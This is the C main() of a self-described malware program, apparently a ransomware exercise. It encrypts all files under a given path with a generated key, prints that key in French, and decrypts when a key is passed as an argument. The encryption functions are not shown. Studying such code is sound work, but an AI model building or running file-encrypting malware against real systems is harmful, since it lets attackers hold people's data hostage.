#include "../includes/malware.h"

int main(int argc, char **argv) {
    if (argc == 1)
        return error("too few arguments");

    char *path = argv[1]; // TODO: '' or ' '

    if (DEBUG)
        printf("path: " GREEN "\"%s\"" RESET "\n", path);

    if (access(path, W_OK) == -1)
        return error("insufficient write permissions");
    
    if (DEBUG && handle_files(path, NULL, print_file) == -1)
        return (EXIT_FAILURE);

    if (argc == 2) {
        unsigned char *key = generate_key();
        if (!key)
            return (error("crypt files"));

        if (handle_files(path, key, crypt_file) == -1)
            return (EXIT_FAILURE);

        printf("Les fichiers ont été chiffrés avec la clé suivante: " GREEN);
        print_key(key);
    } else {
        unsigned char *key = parse_key(argv[2]);

        if (handle_files(path, key, crypt_file) == -1)
            return (error("decrypt files"));

        printf("Les fichiers ont été déchiffrés avec la clé suivante: " GREEN);
        print_key(key);
    }

    return (EXIT_SUCCESS);
}